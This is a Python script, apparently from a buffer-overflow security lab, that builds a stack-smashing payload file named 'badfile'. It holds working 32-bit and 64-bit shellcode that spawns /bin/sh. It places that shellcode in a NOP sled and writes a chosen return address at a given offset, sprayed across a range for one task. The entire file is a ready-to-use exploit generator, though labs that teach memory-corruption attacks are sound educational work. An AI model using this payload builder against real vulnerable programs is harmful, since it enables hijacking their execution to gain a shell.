#!/usr/bin/python3
import sys
import argparse

parser = argparse.ArgumentParser(description='test')
 
parser.add_argument('--length', help='32 bits or 64 bits.')
parser.add_argument('--start', help='start.')
parser.add_argument('--ret', help='return address.')
parser.add_argument('--offset', help='offset.')
parser.add_argument('--task', help='offset.')
 
args = parser.parse_args()
# Replace the content with the actual shellcode
if int(args.length) == 32:
	shellcode= (
	  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
	).encode('latin-1')
else:
	shellcode= (
	  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
	  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
	  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
	).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) # all nop

##################################################################
# Put the shellcode somewhere in the payload
start = int(args.start)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = int(args.ret, base=16)       # Change this number 
offset = int(args.offset)             # Change this number
L =  int(args.length)//8   # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')

if int(args.task) == 4:
	while offset <= int(args.offset) + 100:
		content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
		offset = offset + L

#################################################################
# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
